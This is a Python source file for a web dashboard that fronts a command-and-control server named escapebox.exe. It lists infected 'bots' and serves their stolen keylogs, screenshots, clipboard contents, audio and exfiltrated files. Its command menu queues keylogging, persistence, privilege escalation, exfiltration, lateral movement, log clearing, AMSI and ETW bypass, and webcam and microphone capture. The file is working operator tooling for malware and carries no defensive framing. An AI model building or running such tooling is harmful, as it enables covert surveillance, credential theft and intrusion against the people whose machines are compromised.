#!/usr/bin/env python3
"""
Integrated C2 Web Dashboard Server
Fully integrated with escapebox.exe C2 server
Maintains all current functionalities with enhanced web interface
"""

import http.server
import socketserver
import json
import os
import glob
import base64
import time
import threading
import socket
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import struct

PORT = 8080
C2_COMMAND_PORT = 4444  # Port to send commands to C2 server

class C2WebHandler(http.server.SimpleHTTPRequestHandler):
    """Enhanced web handler with full C2 integration"""
    
    def do_GET(self):
        """Handle GET requests"""
        url = urlparse(self.path)
        path = url.path
        
        # API endpoints
        if path == '/api/status':
            self.send_json_response(self.get_c2_status())
        elif path == '/api/clients':
            self.send_json_response(self.get_clients_data())
        elif path.startswith('/api/client/'):
            client_id = path.split('/')[-1]
            self.send_json_response(self.get_client_details(client_id))
        elif path.startswith('/api/screenshots/'):
            self.serve_screenshot()
        elif path.startswith('/api/keylogs/'):
            self.serve_keylog()
        elif path.startswith('/api/evidence/'):
            evidence_type = path.split('/')[-1]
            self.send_json_response(self.get_evidence_list(evidence_type))
        elif path.startswith('/api/files/'):
            self.serve_file()
        elif path == '/api/commands':
            self.send_json_response(self.get_available_commands())
        elif path == '/api/activity':
            self.send_json_response(self.get_recent_activity())
        elif path == '/api/attack-status':
            self.send_json_response(self.get_attack_status())
        elif path == '/' or path == '/index.html':
            self.serve_dashboard()
        else:
            # Try to serve static files
            super().do_GET()
    
    def do_POST(self):
        """Handle POST requests for command execution"""
        if self.path == '/api/command':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            command_data = json.loads(post_data.decode('utf-8'))
            
            result = self.execute_c2_command(
                command_data.get('client_id'),
                command_data.get('command'),
                command_data.get('parameters', {})
            )
            
            self.send_json_response(result)
        else:
            self.send_error(404)
    
    def send_json_response(self, data):
        """Send JSON response with proper headers"""
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())
    
    def serve_dashboard(self):
        """Serve the cyberpunk dashboard HTML"""
        dashboard_file = 'c2_dashboard_cyberpunk.html'
        if os.path.exists(dashboard_file):
            with open(dashboard_file, 'r', encoding='utf-8') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(content.encode())
        else:
            # Fallback to simple dashboard
            dashboard_file = 'c2_dashboard_simple.html'
            if os.path.exists(dashboard_file):
                with open(dashboard_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content.encode())
            else:
                self.serve_embedded_dashboard()
    
    def serve_embedded_dashboard(self):
        """Serve embedded minimal dashboard"""
        dashboard = """<!DOCTYPE html>
<html>
<head>
    <title>C2 Command & Control Dashboard</title>
    <style>
        body { margin: 0; background: #0a0a0a; color: #0f0; font-family: monospace; }
        .container { padding: 20px; }
        h1 { text-align: center; text-shadow: 0 0 20px #0f0; }
        .stats { display: flex; justify-content: space-around; margin: 30px 0; }
        .stat-box { background: rgba(0,255,0,0.1); border: 1px solid #0f0; padding: 20px; text-align: center; }
        .clients { margin-top: 30px; }
        .client-card { background: rgba(0,255,0,0.05); border: 1px solid #0f0; padding: 15px; margin: 10px 0; }
        button { background: transparent; border: 1px solid #0f0; color: #0f0; padding: 10px; cursor: pointer; }
        button:hover { background: #0f0; color: #000; }
    </style>
</head>
<body>
    <div class="container">
        <h1>C2 COMMAND & CONTROL</h1>
        <div class="stats" id="stats"></div>
        <div class="clients" id="clients"></div>
    </div>
    <script>
        async function updateDashboard() {
            // Fetch status
            const statusResp = await fetch('/api/status');
            const status = await statusResp.json();
            
            document.getElementById('stats').innerHTML = `
                <div class="stat-box">
                    <h2>${status.total_bots || 0}</h2>
                    <p>Total Bots</p>
                </div>
                <div class="stat-box">
                    <h2>${status.active_bots || 0}</h2>
                    <p>Active</p>
                </div>
                <div class="stat-box">
                    <h2>${status.total_commands || 0}</h2>
                    <p>Commands</p>
                </div>
            `;
            
            // Fetch clients
            const clientsResp = await fetch('/api/clients');
            const clientsData = await clientsResp.json();
            
            let clientsHtml = '<h2>Connected Bots</h2>';
            clientsData.clients.forEach(client => {
                clientsHtml += `
                    <div class="client-card">
                        <h3>${client.hostname} (${client.id})</h3>
                        <p>IP: ${client.ip} | User: ${client.username}</p>
                        <p>OS: ${client.os} | Elevated: ${client.elevated ? 'Yes' : 'No'}</p>
                        <p>Status: ${client.status} | Last Seen: ${new Date(client.last_seen * 1000).toLocaleString()}</p>
                        <button onclick="sendCommand('${client.id}', 'SYSINFO')">System Info</button>
                        <button onclick="sendCommand('${client.id}', 'SCREENSHOT')">Screenshot</button>
                        <button onclick="sendCommand('${client.id}', 'KEYLOG:START')">Start Keylogger</button>
                    </div>
                `;
            });
            document.getElementById('clients').innerHTML = clientsHtml;
        }
        
        async function sendCommand(clientId, command) {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: clientId, command: command })
            });
            const result = await response.json();
            alert('Command sent: ' + result.status);
            updateDashboard();
        }
        
        updateDashboard();
        setInterval(updateDashboard, 5000);
    </script>
</body>
</html>"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(dashboard.encode())
    
    def get_c2_status(self):
        """Get current C2 server status"""
        status_file = "C:\\Windows\\Temp\\C2_Status.json"
        
        # Try to read status file
        if os.path.exists(status_file):
            try:
                with open(status_file, 'r') as f:
                    status = json.load(f)
                    # Add calculated uptime
                    if 'server_start_time' in status:
                        start_time = int(status['server_start_time'])
                        uptime_seconds = int(time.time()) - start_time
                        hours = uptime_seconds // 3600
                        minutes = (uptime_seconds % 3600) // 60
                        status['uptime'] = f"{hours}h {minutes}m"
                    return status
            except:
                pass
        
        # Return default status if file not found
        return {
            "server_status": "active",
            "total_bots": 0,
            "active_bots": 0,
            "total_commands": 0,
            "uptime": "Unknown",
            "last_update": int(time.time())
        }
    
    def get_clients_data(self):
        """Get all connected clients data"""
        clients = []
        
        # Read individual bot files
        bot_files = glob.glob("C:\\Windows\\Temp\\C2_Bots\\*.json")
        for bot_file in bot_files:
            try:
                with open(bot_file, 'r') as f:
                    client_data = json.load(f)
                    # Calculate online duration
                    if 'connect_time' in client_data:
                        connect_time = int(client_data['connect_time'])
                        online_seconds = int(time.time()) - connect_time
                        client_data['online_duration'] = f"{online_seconds // 60}m"
                    clients.append(client_data)
            except:
                continue
        
        # Sort by last seen (most recent first)
        clients.sort(key=lambda x: x.get('last_seen', 0), reverse=True)
        
        return {"clients": clients}
    
    def get_client_details(self, client_id):
        """Get detailed information for a specific client"""
        details = {
            "client_id": client_id,
            "screenshots": [],
            "keylogs": [],
            "exfiltrated_files": [],
            "clipboard_dumps": [],
            "system_info": {},
            "command_history": [],
            "processes": [],
            "network_connections": []
        }
        
        # Screenshot data
        screenshot_dir = "C:\\Windows\\Temp\\C2_Screenshots"
        if os.path.exists(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if client_id in file:
                    file_path = os.path.join(screenshot_dir, file)
                    file_stat = os.stat(file_path)
                    if file.endswith('.b64'):
                        details["screenshots"].append({
                            "filename": file,
                            "size": file_stat.st_size,
                            "timestamp": file_stat.st_mtime,
                            "url": f"/api/screenshots/{file}"
                        })
        
        # Keylog data
        keylog_dir = "C:\\Windows\\Temp\\C2_Keylogs"
        if os.path.exists(keylog_dir):
            for file in os.listdir(keylog_dir):
                if client_id in file and file != "MASTER_KEYLOG.txt":
                    file_path = os.path.join(keylog_dir, file)
                    file_stat = os.stat(file_path)
                    details["keylogs"].append({
                        "filename": file,
                        "size": file_stat.st_size,
                        "timestamp": file_stat.st_mtime,
                        "url": f"/api/keylogs/{file}"
                    })
        
        # Exfiltrated data
        exfil_dir = "C:\\Windows\\Temp\\C2_Exfiltrated"
        if os.path.exists(exfil_dir):
            for file in os.listdir(exfil_dir):
                if client_id in file:
                    file_path = os.path.join(exfil_dir, file)
                    file_stat = os.stat(file_path)
                    details["exfiltrated_files"].append({
                        "filename": file,
                        "size": file_stat.st_size,
                        "timestamp": file_stat.st_mtime
                    })
        
        # Clipboard data
        clipboard_dir = "C:\\Windows\\Temp\\C2_Clipboard"
        if os.path.exists(clipboard_dir):
            for file in os.listdir(clipboard_dir):
                if client_id in file:
                    file_path = os.path.join(clipboard_dir, file)
                    file_stat = os.stat(file_path)
                    details["clipboard_dumps"].append({
                        "filename": file,
                        "size": file_stat.st_size,
                        "timestamp": file_stat.st_mtime
                    })
        
        # Read system info if available
        sysinfo_file = f"C:\\Windows\\Temp\\C2_Bots\\{client_id}_sysinfo.json"
        if os.path.exists(sysinfo_file):
            try:
                with open(sysinfo_file, 'r') as f:
                    details["system_info"] = json.load(f)
            except:
                pass
        
        # Read command history
        history_file = f"C:\\Windows\\Temp\\C2_Bots\\{client_id}_history.json"
        if os.path.exists(history_file):
            try:
                with open(history_file, 'r') as f:
                    details["command_history"] = json.load(f)
            except:
                pass
        
        return details
    
    def serve_screenshot(self):
        """Serve screenshot image"""
        filename = self.path.split('/')[-1]
        screenshot_path = f"C:\\Windows\\Temp\\C2_Screenshots\\{filename}"
        
        if os.path.exists(screenshot_path):
            if filename.endswith('.b64'):
                # Decode base64 and serve as BMP image
                try:
                    with open(screenshot_path, 'r') as f:
                        b64_data = f.read()
                    img_data = base64.b64decode(b64_data)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'image/bmp')
                    self.send_header('Content-Length', len(img_data))
                    self.end_headers()
                    self.wfile.write(img_data)
                except Exception as e:
                    self.send_error(500, f"Error decoding image: {str(e)}")
            else:
                # Serve as text (metadata)
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                with open(screenshot_path, 'rb') as f:
                    self.wfile.write(f.read())
        else:
            self.send_error(404, "Screenshot not found")
    
    def serve_keylog(self):
        """Serve keylog file"""
        filename = self.path.split('/')[-1]
        keylog_path = f"C:\\Windows\\Temp\\C2_Keylogs\\{filename}"
        
        if os.path.exists(keylog_path):
            self.send_response(200)
            self.send_header('Content-type', 'text/plain; charset=utf-8')
            self.end_headers()
            with open(keylog_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404, "Keylog not found")
    
    def serve_file(self):
        """Serve general files"""
        filename = self.path.split('/')[-1]
        
        # Try different directories
        possible_paths = [
            f"C:\\Windows\\Temp\\C2_Exfiltrated\\{filename}",
            f"C:\\Windows\\Temp\\C2_Clipboard\\{filename}",
            f"C:\\Windows\\Temp\\C2_Audio\\{filename}",
            f"C:\\temp\\{filename}"
        ]
        
        for file_path in possible_paths:
            if os.path.exists(file_path):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                with open(file_path, 'rb') as f:
                    self.wfile.write(f.read())
                return
        
        self.send_error(404, "File not found")
    
    def get_evidence_list(self, evidence_type):
        """Get list of evidence files by type"""
        files = []
        
        try:
            if evidence_type == 'screenshots':
                evidence_dir = "C:\\Windows\\Temp\\C2_Screenshots"
                if os.path.exists(evidence_dir):
                    for filename in os.listdir(evidence_dir):
                        if filename.endswith('.b64'):
                            file_path = os.path.join(evidence_dir, filename)
                            file_stat = os.stat(file_path)
                            files.append({
                                "filename": filename,
                                "size": file_stat.st_size,
                                "timestamp": file_stat.st_mtime,
                                "type": "screenshot",
                                "url": f"/api/screenshots/{filename}"
                            })
            
            elif evidence_type == 'keylogs':
                evidence_dir = "C:\\Windows\\Temp\\C2_Keylogs"
                if os.path.exists(evidence_dir):
                    for filename in os.listdir(evidence_dir):
                        if filename.endswith('.txt') and filename != "MASTER_KEYLOG.txt":
                            file_path = os.path.join(evidence_dir, filename)
                            file_stat = os.stat(file_path)
                            files.append({
                                "filename": filename,
                                "size": file_stat.st_size,
                                "timestamp": file_stat.st_mtime,
                                "type": "keylog",
                                "url": f"/api/keylogs/{filename}"
                            })
            
            elif evidence_type == 'files':
                # Check multiple directories for exfiltrated files
                directories = [
                    "C:\\Windows\\Temp\\C2_Exfiltrated",
                    "C:\\Windows\\Temp\\C2_Clipboard"
                ]
                
                for evidence_dir in directories:
                    if os.path.exists(evidence_dir):
                        for filename in os.listdir(evidence_dir):
                            file_path = os.path.join(evidence_dir, filename)
                            file_stat = os.stat(file_path)
                            files.append({
                                "filename": filename,
                                "size": file_stat.st_size,
                                "timestamp": file_stat.st_mtime,
                                "type": "exfiltrated",
                                "url": f"/api/files/{filename}"
                            })
            
            elif evidence_type == 'audio':
                evidence_dir = "C:\\Windows\\Temp\\C2_Audio"
                if os.path.exists(evidence_dir):
                    for filename in os.listdir(evidence_dir):
                        file_path = os.path.join(evidence_dir, filename)
                        file_stat = os.stat(file_path)
                        files.append({
                            "filename": filename,
                            "size": file_stat.st_size,
                            "timestamp": file_stat.st_mtime,
                            "type": "audio",
                            "url": f"/api/files/{filename}"
                        })
            
            # Sort files by timestamp (newest first)
            files.sort(key=lambda x: x['timestamp'], reverse=True)
            
        except Exception as e:
            print(f"Error getting evidence list: {e}")
        
        return {"files": files}
    
    def get_available_commands(self):
        """Return list of available C2 commands"""
        return {
            "commands": [
                {"name": "SYSINFO", "description": "Get system information"},
                {"name": "SCREENSHOT", "description": "Capture screenshot"},
                {"name": "KEYLOG:START", "description": "Start keylogger"},
                {"name": "KEYLOG:DUMP", "description": "Dump keylogger buffer"},
                {"name": "PROC", "description": "List processes"},
                {"name": "NETSTAT", "description": "Show network connections"},
                {"name": "PERSISTENCE", "description": "Install persistence"},
                {"name": "ELEVATE", "description": "Attempt privilege escalation"},
                {"name": "EXFIL", "description": "Exfiltrate data"},
                {"name": "LATERAL", "description": "Lateral movement scan"},
                {"name": "CLEARLOG", "description": "Clear Windows logs"},
                {"name": "AMSIBYPASS", "description": "Bypass AMSI"},
                {"name": "ETWDISABLE", "description": "Disable ETW"},
                {"name": "WEBCAM:CAPTURE", "description": "Capture webcam image"},
                {"name": "MIC:RECORD:START", "description": "Start microphone recording"},
                {"name": "BEACON", "description": "Force beacon"},
                {"name": "KILL", "description": "Terminate client"}
            ]
        }
    
    def get_recent_activity(self):
        """Get recent C2 activity from logs"""
        activities = []
        log_file = "C:\\Windows\\Temp\\c2_activity.log"
        
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r') as f:
                    # Read last 50 lines
                    lines = f.readlines()[-50:]
                    for line in reversed(lines):
                        if line.strip():
                            # Parse log line
                            parts = line.strip().split('] [')
                            if len(parts) >= 3:
                                timestamp = parts[0].strip('[')
                                category = parts[1]
                                action = parts[2].split('] ', 1)[0]
                                message = parts[2].split('] ', 1)[1] if '] ' in parts[2] else ''
                                
                                activities.append({
                                    "timestamp": timestamp,
                                    "category": category,
                                    "action": action,
                                    "message": message
                                })
            except:
                pass
        
        return {"activities": activities[:20]}  # Return last 20 activities
    
    def get_attack_status(self):
        """Get current attack phase status based on real activity"""
        # Read actual activity from logs to determine real status
        phases = {
            "initial_access": {"status": "idle", "techniques": []},
            "execution": {"status": "idle", "techniques": []},
            "persistence": {"status": "idle", "techniques": []},
            "privilege_escalation": {"status": "idle", "techniques": []},
            "defense_evasion": {"status": "idle", "techniques": []},
            "credential_access": {"status": "idle", "techniques": []},
            "discovery": {"status": "idle", "techniques": []},
            "lateral_movement": {"status": "idle", "techniques": []},
            "collection": {"status": "idle", "techniques": []},
            "exfiltration": {"status": "idle", "techniques": []},
            "impact": {"status": "idle", "techniques": []}
        }
        
        # Only show active phases if there are actual connected clients
        clients_data = self.get_clients_data()
        if clients_data["clients"]:
            # Only mark as active if we have real clients
            phases["initial_access"]["status"] = "active"
            phases["discovery"]["status"] = "active"
        
        return {"phases": phases}
    
    def execute_c2_command(self, client_id, command, parameters=None):
        """Send command to C2 server for execution via file queue"""
        try:
            # Create command queue directory
            queue_dir = "C:\\Windows\\Temp\\C2_CommandQueue"
            os.makedirs(queue_dir, exist_ok=True)
            
            # Create command file
            timestamp = int(time.time() * 1000)
            if client_id:
                # Command for specific client
                cmd_file = f"{queue_dir}\\cmd_{timestamp}_{client_id.replace(':', '_')}.json"
            else:
                # Global command
                cmd_file = f"{queue_dir}\\cmd_{timestamp}_global.json"
            
            cmd_data = {
                "timestamp": timestamp,
                "client_id": client_id,
                "command": command,
                "parameters": parameters or {},
                "status": "pending"
            }
            
            # Write command file
            with open(cmd_file, 'w') as f:
                json.dump(cmd_data, f, indent=2)
            
            return {
                "status": "success",
                "message": f"Command '{command}' queued" + (f" for {client_id}" if client_id else " globally"),
                "command_id": timestamp
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": f"Failed to queue command: {str(e)}"
            }

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """Handle requests in separate threads"""
    allow_reuse_address = True

def update_status_monitor():
    """Background thread to monitor C2 status"""
    while True:
        try:
            # Check if C2 server is running
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', 443))
            sock.close()
            
            if result != 0:
                # C2 server not running, update status
                status = {
                    "server_status": "offline",
                    "total_bots": 0,
                    "active_bots": 0,
                    "message": "C2 server not running"
                }
                with open("C:\\Windows\\Temp\\C2_Status.json", 'w') as f:
                    json.dump(status, f)
            
        except:
            pass
        
        time.sleep(10)  # Check every 10 seconds

def main():
    """Main function to start the web server"""
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║         C2 WEB DASHBOARD - INTEGRATED SERVER          ║
    ╠═══════════════════════════════════════════════════════╣
    ║  [*] Starting web server on port 8080...              ║
    ║  [*] Dashboard URL: http://localhost:8080             ║
    ║  [*] API Base URL: http://localhost:8080/api         ║
    ║                                                       ║
    ║  [!] Make sure escapebox.exe server is running!      ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    
    # Create necessary directories
    directories = [
        "C:\\Windows\\Temp\\C2_Bots",
        "C:\\Windows\\Temp\\C2_Screenshots",
        "C:\\Windows\\Temp\\C2_Keylogs",
        "C:\\Windows\\Temp\\C2_Exfiltrated",
        "C:\\Windows\\Temp\\C2_Clipboard"
    ]
    
    for directory in directories:
        os.makedirs(directory, exist_ok=True)
    
    # Start status monitor thread
    monitor_thread = threading.Thread(target=update_status_monitor, daemon=True)
    monitor_thread.start()
    
    # Change to script directory
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # Start web server
    with ThreadedTCPServer(("", PORT), C2WebHandler) as httpd:
        print(f"[+] Web server started successfully!")
        print(f"[+] Serving on http://0.0.0.0:{PORT}")
        print(f"[*] Press Ctrl+C to stop\n")
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Shutting down web server...")
            httpd.shutdown()

if __name__ == "__main__":
    main()
